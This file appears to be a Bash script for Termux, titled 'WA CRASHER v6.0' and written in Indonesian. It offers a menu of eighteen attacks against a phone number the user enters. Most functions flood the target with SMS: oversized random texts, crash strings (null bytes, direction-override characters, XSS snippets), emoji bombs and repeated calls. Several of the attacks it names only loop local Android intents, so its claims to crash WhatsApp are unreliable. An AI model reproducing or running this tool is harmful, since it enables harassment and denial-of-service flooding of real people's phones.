#!/bin/bash

# color
RED='\033[0;31m'
GREEN='\033[0;32m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
YELLOW='\033[1;33m'
PURPLE='\033[0;35m'
WHITE='\033[1;37m'
NC='\033[0m'

clear

# Logo
echo -e "${RED}"
echo "   ███████╗██╗   ██╗██████╗ ██╗   ██╗██╗     ██╗"
echo "   ╚══███╔╝╚██╗ ██╔╝██╔══██╗╚██╗ ██╔╝██║     ██║"
echo "     ███╔╝  ╚████╔╝ ██████╔╝ ╚████╔╝ ██║     ██║"
echo "    ███╔╝    ╚██╔╝  ██╔══██╗  ╚██╔╝  ██║     ██║"
echo -e "   ███████╗   ██║   ██║  ██║   ██║   ███████╗███████╗${NC}"
echo -e "${GREEN}"
echo "   ██╗    ██╗ █████╗      ██████╗██████╗  █████╗ ███████╗██╗  ██╗███████╗██████╗ "
echo "   ██║    ██║██╔══██╗    ██╔════╝██╔══██╗██╔══██╗██╔════╝██║  ██║██╔════╝██╔══██╗"
echo "   ██║ █╗ ██║███████║    ██║     ██████╔╝███████║███████╗███████║█████╗  ██████╔╝"
echo "   ██║███╗██║██╔══██║    ██║     ██╔══██╗██╔══██║╚════██║██╔══██║██╔══╝  ██╔══██╗"
echo "   ╚███╔███╔╝██║  ██║    ╚██████╗██║  ██║██║  ██║███████║██║  ██║███████╗██║  ██║"
echo -e "    ╚══╝╚══╝ ╚═╝  ╚═╝     ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝${NC}"
echo -e "${PURPLE}                   WA CRASHER v6.0 - ULTIMATE EDITION${NC}"
echo -e "${YELLOW}               Author: Zyrull Security Team - Full Brutal${NC}"
echo -e "${CYAN}               ⚠️  Dengan Timer Keamanan - Tidak Permanent ⚠️${NC}"
echo ""

# Variabel Timer
timer_duration=0
timer_end=0

# Function Timer
start_timer() {
    local minutes=$1
    timer_duration=$((minutes * 60))
    timer_end=$((SECONDS + timer_duration))
    echo -e "${GREEN}[✓] Timer diaktifkan: ${minutes} menit! WA akan normal kembali setelah timer habis.${NC}"
}

check_timer() {
    if [ $timer_end -ne 0 ] && [ $SECONDS -ge $timer_end ]; then
        echo -e "\n${GREEN}[✓] Timer selesai! Serangan berhenti otomatis.${NC}"
        return 1
    fi
    return 0
}

# Format nomor dengan prefix 0-99
format_number() {
    local num=$1
    if [ $num -lt 10 ]; then
        echo "0$num"
    else
        echo "$num"
    fi
}

# Black Screen
fitur_01() {
    local nomor=$1
    local duration=$2
    echo -e "${RED}[01] Black Screen Ultimate Attack on +$nomor${NC}"
    local end=$((SECONDS + duration))
    while [ $SECONDS -lt $end ] && check_timer; do
        local pesan=$(cat /dev/urandom | tr -dc 'A-Za-z0-9!@#$%^&*()_+-=[]{};:,.<>?/~`' | fold -w 65535 | head -n 1)
        echo "$pesan" | timeout 2 termux-sms-send -n $nomor -- 2>/dev/null &
        printf "\r${YELLOW}[*] Black Screen: %d/%d detik${NC}   " $((SECONDS - (end - duration))) $duration
        sleep 0.05
    done
    echo ""
}

# Force Close
fitur_02() {
    local nomor=$1
    local duration=$2
    echo -e "${RED}[02] Force Close Massal Attack on +$nomor${NC}"
    local payloads=(
        "\u0000\u0000\u0000\u0000\u0000\u0000"
        "%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%"
        "\xFF\xFE\xFD\xFC\xFB\xFA\xF9\xF8"
        "nullnullnullnullnullnull"
        "[object Object]"*100
        "<script>while(1){alert('ZyRull')}</script>"
        "‮‭⁦⁧⁨⁩⁪⁫⁬⁭⁮⁯"*50
    )
    local end=$((SECONDS + duration))
    while [ $SECONDS -lt $end ] && check_timer; do
        for payload in "${payloads[@]}"; do
            echo "$payload" | timeout 2 termux-sms-send -n $nomor -- 2>/dev/null &
        done
        printf "\r${YELLOW}[*] Force Close: %d/%d detik${NC}   " $((SECONDS - (end - duration))) $duration
        sleep 0.05
    done
    echo ""
}

# Delay Custom
fitur_03() {
    local nomor=$1
    local duration=$2
    local delay=$3
    echo -e "${RED}[03] Delay Custom Attack on +$nomor (delay ${delay}ms)${NC}"
    local end=$((SECONDS + duration))
    local count=0
    while [ $SECONDS -lt $end ] && check_timer; do
        count=$((count+1))
        local pesan="[ZYRULL] Attack #$count - $(date +%H:%M:%S)"
        echo "$pesan" | timeout 2 termux-sms-send -n $nomor -- 2>/dev/null &
        printf "\r${YELLOW}[*] Delay Attack: %d/%d detik - Pesan: %d${NC}   " $((SECONDS - (end - duration))) $duration $count
        sleep $(echo "$delay/1000" | bc -l 2>/dev/null || echo "0.1")
    done
    echo ""
}

# stiker Bomb Nuklir
fitur_04() {
    local nomor=$1
    local duration=$2
    echo -e "${RED}[04] Character Bomb Nuklir on +$nomor${NC}"
    local emojis=("💀" "👻" "🤡" "💩" "🎃" "🔥" "💣" "⚡" "🌀" "🌊" "🤖" "👾" "💢" "❌" "⚠️" "🔞" "💀" "👹" "👺" "💔")
    local end=$((SECONDS + duration))
    while [ $SECONDS -lt $end ] && check_timer; do
        local bomb=""
        for e in $(seq 1 200); do
            bomb="${bomb}${emojis[$RANDOM % ${#emojis[@]}]}"
        done
        echo "$bomb" | timeout 2 termux-sms-send -n $nomor -- 2>/dev/null &
        printf "\r${YELLOW}[*] Character Bomb: %d/%d detik${NC}   " $((SECONDS - (end - duration))) $duration
        sleep 0.03
    done
    echo ""
}

# Media Spam
fitur_05() {
    local nomor=$1
    local duration=$2
    echo -e "${RED}[05] Media Spam Attack on +$nomor${NC}"
    dd if=/dev/zero of=/sdcard/zyrull_dummy.bin bs=1M count=10 2>/dev/null
    local end=$((SECONDS + duration))
    while [ $SECONDS -lt $end ] && check_timer; do
        termux-share -a send /sdcard/zyrull_dummy.bin 2>/dev/null &
        am start -a android.intent.action.SEND -t "image/jpeg" -d "file:///sdcard/zyrull_dummy.bin" 2>/dev/null &
        printf "\r${YELLOW}[*] Media Spam: %d/%d detik${NC}   " $((SECONDS - (end - duration))) $duration
        sleep 0.1
    done
    echo ""
    rm -f /sdcard/zyrull_dummy.bin
}

# call Bomb
fitur_06() {
    local nomor=$1
    local duration=$2
    echo -e "${RED}[06] Call Bomb Attack on +$nomor${NC}"
    local end=$((SECONDS + duration))
    while [ $SECONDS -lt $end ] && check_timer; do
        termux-telephony-call $nomor 2>/dev/null &
        sleep 0.5
        input keyevent KEYCODE_ENDCALL 2>/dev/null &
        printf "\r${YELLOW}[*] Call Bomb: %d/%d detik${NC}   " $((SECONDS - (end - duration))) $duration
        sleep 0.5
    done
    echo ""
}

# WhatsApp Web Exploit
fitur_07() {
    local nomor=$1
    local duration=$2
    echo -e "${RED}[07] WhatsApp Web Exploit on +$nomor${NC}"
    local end=$((SECONDS + duration))
    while [ $SECONDS -lt $end ] && check_timer; do
        local payload='{"type":"chat","content":"<img src=x onerror=alert(1)>"}'
        echo "$payload" | timeout 2 termux-sms-send -n $nomor -- 2>/dev/null &
        printf "\r${YELLOW}[*] Web Exploit: %d/%d detik${NC}   " $((SECONDS - (end - duration))) $duration
        sleep 0.1
    done
    echo ""
}

# Infinite Typing
fitur_08() {
    local nomor=$1
    local duration=$2
    echo -e "${RED}[08] Infinite Typing Attack on +$nomor${NC}"
    local end=$((SECONDS + duration))
    while [ $SECONDS -lt $end ] && check_timer; do
        input text "$(cat /dev/urandom | tr -dc 'a-zA-Z' | fold -w 1000 | head -n 1)" 2>/dev/null &
        printf "\r${YELLOW}[*] Infinite Typing: %d/%d detik${NC}   " $((SECONDS - (end - duration))) $duration
        sleep 0.01
    done
    echo ""
}

# Group Spam Invite
fitur_09() {
    local nomor=$1
    local duration=$2
    echo -e "${RED}[09] Group Spam Invite on +$nomor${NC}"
    local end=$((SECONDS + duration))
    while [ $SECONDS -lt $end ] && check_timer; do
        am start -a android.intent.action.VIEW -d "https://chat.whatsapp.com/invite/fake$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 10 | head -n 1)" 2>/dev/null &
        printf "\r${YELLOW}[*] Group Invite: %d/%d detik${NC}   " $((SECONDS - (end - duration))) $duration
        sleep 0.2
    done
    echo ""
}

# Voice Note Spam
fitur_10() {
    local nomor=$1
    local duration=$2
    echo -e "${RED}[10] Voice Note Spam on +$nomor${NC}"
    dd if=/dev/urandom of=/sdcard/zyrull_voice.ogg bs=1K count=100 2>/dev/null
    local end=$((SECONDS + duration))
    while [ $SECONDS -lt $end ] && check_timer; do
        termux-share -a send /sdcard/zyrull_voice.ogg 2>/dev/null &
        printf "\r${YELLOW}[*] Voice Spam: %d/%d detik${NC}   " $((SECONDS - (end - duration))) $duration
        sleep 0.15
    done
    echo ""
    rm -f /sdcard/zyrull_voice.ogg
}

# Contact Card Bomb
fitur_11() {
    local nomor=$1
    local duration=$2
    echo -e "${RED}[11] Contact Card Bomb on +$nomor${NC}"
    local end=$((SECONDS + duration))
    while [ $SECONDS -lt $end ] && check_timer; do
        am start -a android.intent.action.INSERT -t "vnd.android.cursor.dir/contact" -e "name" "ZYRULL $RANDOM" -e "phone" "$RANDOM" 2>/dev/null &
        printf "\r${YELLOW}[*] Contact Bomb: %d/%d detik${NC}   " $((SECONDS - (end - duration))) $duration
        sleep 0.1
    done
    echo ""
}

# location Spam
fitur_12() {
    local nomor=$1
    local duration=$2
    echo -e "${RED}[12] Location Spam on +$nomor${NC}"
    local end=$((SECONDS + duration))
    while [ $SECONDS -lt $end ] && check_timer; do
        am start -a android.intent.action.VIEW -d "geo:$(shuf -i -90-90 -n 1),$(shuf -i -180-180 -n 1)" 2>/dev/null &
        printf "\r${YELLOW}[*] Location Spam: %d/%d detik${NC}   " $((SECONDS - (end - duration))) $duration
        sleep 0.1
    done
    echo ""
}

# sticker Bomb
fitur_13() {
    local nomor=$1
    local duration=$2
    echo -e "${RED}[13] Sticker Bomb on +$nomor${NC}"
    local end=$((SECONDS + duration))
    while [ $SECONDS -lt $end ] && check_timer; do
        am start -a android.intent.action.VIEW -d "https://sticker.ly/s/zyrull$RANDOM" 2>/dev/null &
        printf "\r${YELLOW}[*] Sticker Bomb: %d/%d detik${NC}   " $((SECONDS - (end - duration))) $duration
        sleep 0.08
    done
    echo ""
}

# Database Corruption
fitur_14() {
    local nomor=$1
    local duration=$2
    echo -e "${RED}[14] Database Corruption on +$nomor${NC}"
    local end=$((SECONDS + duration))
    while [ $SECONDS -lt $end ] && check_timer; do
        local corrupt="SQLITE_MALFORMED_$(cat /dev/urandom | tr -dc 'A-Z' | fold -w 500 | head -n 1)"
        echo "$corrupt" | timeout 2 termux-sms-send -n $nomor -- 2>/dev/null &
        printf "\r${YELLOW}[*] DB Corrupt: %d/%d detik${NC}   " $((SECONDS - (end - duration))) $duration
        sleep 0.05
    done
    echo ""
}

# RAM Eater
fitur_15() {
    local nomor=$1
    local duration=$2
    echo -e "${RED}[15] RAM Eater Attack on +$nomor${NC}"
    local end=$((SECONDS + duration))
    while [ $SECONDS -lt $end ] && check_timer; do
        local data=$(cat /dev/urandom | tr -dc 'A-Za-z0-9' | fold -w 50000 | head -n 1)
        for j in $(seq 1 10); do
            echo "$data" | timeout 2 termux-sms-send -n $nomor -- 2>/dev/null &
        done
        printf "\r${YELLOW}[*] RAM Eater: %d/%d detik${NC}   " $((SECONDS - (end - duration))) $duration
        sleep 0.02
    done
    echo ""
}

# Notification Flood
fitur_16() {
    local nomor=$1
    local duration=$2
    echo -e "${RED}[16] Notification Flood on +$nomor${NC}"
    local end=$((SECONDS + duration))
    while [ $SECONDS -lt $end ] && check_timer; do
        termux-notification -t "ZYRULL ATTACK" -c "Pesan ke $nomor - $(date +%H:%M:%S)" 2>/dev/null &
        printf "\r${YELLOW}[*] Notif Flood: %d/%d detik${NC}   " $((SECONDS - (end - duration))) $duration
        sleep 0.01
    done
    echo ""
}

# Clipboard Hijack
fitur_17() {
    local nomor=$1
    local duration=$2
    echo -e "${RED}[17] Clipboard Hijack on +$nomor${NC}"
    local end=$((SECONDS + duration))
    while [ $SECONDS -lt $end ] && check_timer; do
        echo "ZYRULL WAS HERE - $(date)" | termux-clipboard-set 2>/dev/null &
        printf "\r${YELLOW}[*] Clipboard: %d/%d detik${NC}   " $((SECONDS - (end - duration))) $duration
        sleep 0.05
    done
    echo ""
}

# 18. Full Brutal (Semua Fitur)
fitur_18() {
    local nomor=$1
    local duration=$2
    echo -e "${RED}[18] FULL BRUTAL MODE - All 17 Attacks Simultaneously!${NC}"
    echo -e "${YELLOW}[!] Ini akan sangat berat untuk target!${NC}"
    
    fitur_01 $nomor $duration &
    fitur_02 $nomor $duration &
    fitur_03 $nomor $duration 50 &
    fitur_04 $nomor $duration &
    fitur_05 $nomor $duration &
    fitur_06 $nomor $duration &
    fitur_07 $nomor $duration &
    fitur_08 $nomor $duration &
    fitur_09 $nomor $duration &
    fitur_10 $nomor $duration &
    fitur_11 $nomor $duration &
    fitur_12 $nomor $duration &
    fitur_13 $nomor $duration &
    fitur_14 $nomor $duration &
    fitur_15 $nomor $duration &
    fitur_16 $nomor $duration &
    fitur_17 $nomor $duration &
    
    wait
}

# halaman utama
show_menu() {
    echo -e "${CYAN}╔══════════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${CYAN}║                    ULTIMATE ATTACK MENU                          ║${NC}"
    echo -e "${CYAN}╠══════════════════════════════════════════════════════════════════╣${NC}"
    echo -e "${CYAN}║${NC}  ${RED}01${NC}. Black Screen Ultimate    ${RED}10${NC}. Voice Note Spam            ${CYAN}║${NC}"
    echo -e "${CYAN}║${NC}  ${RED}02${NC}. Force Close Massal      ${RED}11${NC}. Contact Card Bomb          ${CYAN}║${NC}"
    echo -e "${CYAN}║${NC}  ${RED}03${NC}. Delay Custom            ${RED}12${NC}. Location Spam              ${CYAN}║${NC}"
    echo -e "${CYAN}║${NC}  ${RED}04${NC}. Character Bomb Nuklir   ${RED}13${NC}. Sticker Bomb               ${CYAN}║${NC}"
    echo -e "${CYAN}║${NC}  ${RED}05${NC}. Media Spam              ${RED}14${NC}. Database Corruption        ${CYAN}║${NC}"
    echo -e "${CYAN}║${NC}  ${RED}06${NC}. Call Bomb               ${RED}15${NC}. RAM Eater                  ${CYAN}║${NC}"
    echo -e "${CYAN}║${NC}  ${RED}07${NC}. WhatsApp Web Exploit    ${RED}16${NC}. Notification Flood         ${CYAN}║${NC}"
    echo -e "${CYAN}║${NC}  ${RED}08${NC}. Infinite Typing         ${RED}17${NC}. Clipboard Hijack           ${CYAN}║${NC}"
    echo -e "${CYAN}║${NC}  ${RED}09${NC}. Group Spam Invite       ${RED}18${NC}. FULL BRUTAL MODE           ${CYAN}║${NC}"
    echo -e "${CYAN}╠══════════════════════════════════════════════════════════════════╣${NC}"
    echo -e "${CYAN}║${NC}  ${YELLOW}99${NC}. Set Timer Keamanan (WA tidak permanent)         ${CYAN}║${NC}"
    echo -e "${CYAN}║${NC}  ${YELLOW}00${NC}. Exit                                            ${CYAN}║${NC}"
    echo -e "${CYAN}╚══════════════════════════════════════════════════════════════════╝${NC}"
    echo ""
}

# Main Program
while true; do
    show_menu
    echo -ne "${YELLOW}Pilih Fitur (01-18, 99, 00): ${NC}"
    read fitur
    
    if [ "$fitur" = "00" ]; then
        echo -e "${RED}[!] Keluar dari tools...${NC}"
        exit 0
    fi
    
    if [ "$fitur" = "99" ]; then
        echo -ne "${YELLOW}Set timer (menit, 1-60): ${NC}"
        read timer_min
        if [ $timer_min -ge 1 ] && [ $timer_min -le 60 ]; then
            start_timer $timer_min
        else
            echo -e "${RED}[!] Timer harus 1-60 menit!${NC}"
        fi
        continue
    fi
    
    echo -ne "${YELLOW}Nomor Target (62xxxxxxxxxx): ${NC}"
    read nomor
    
    # Format nomor dengan prefix
    nomor_formatted=$(format_number $nomor)
    
    echo -ne "${YELLOW}Durasi serangan (detik, 1-300): ${NC}"
    read duration
    
    if [ $duration -gt 300 ]; then
        duration=300
        echo -e "${YELLOW}[!] Durasi maksimal 300 detik (5 menit)${NC}"
    fi
    
    # Reset timer end jika tidak menggunakan timer
    if [ $timer_end -eq 0 ]; then
        timer_end=999999999
    fi
    
    echo -e "${GREEN}[✓] Memulai serangan ke +$nomor_formatted selama ${duration} detik...${NC}"
    
    case $fitur in
        01) fitur_01 $nomor_formatted $duration ;;
        02) fitur_02 $nomor_formatted $duration ;;
        03) 
            echo -ne "${YELLOW}Delay (ms, 1-1000): ${NC}"
            read delay
            fitur_03 $nomor_formatted $duration $delay
            ;;
        04) fitur_04 $nomor_formatted $duration ;;
        05) fitur_05 $nomor_formatted $duration ;;
        06) fitur_06 $nomor_formatted $duration ;;
        07) fitur_07 $nomor_formatted $duration ;;
        08) fitur_08 $nomor_formatted $duration ;;
        09) fitur_09 $nomor_formatted $duration ;;
        10) fitur_10 $nomor_formatted $duration ;;
        11) fitur_11 $nomor_formatted $duration ;;
        12) fitur_12 $nomor_formatted $duration ;;
        13) fitur_13 $nomor_formatted $duration ;;
        14) fitur_14 $nomor_formatted $duration ;;
        15) fitur_15 $nomor_formatted $duration ;;
        16) fitur_16 $nomor_formatted $duration ;;
        17) fitur_17 $nomor_formatted $duration ;;
        18) fitur_18 $nomor_formatted $duration ;;
        *) echo -e "${RED}[!] Pilihan tidak valid!${NC}" ;;
    esac
    
    echo -e "${GREEN}[✓] Serangan selesai!${NC}"
    echo ""
    echo -e "${YELLOW}Tekan Enter untuk kembali ke menu...${NC}"
    read
    clear
done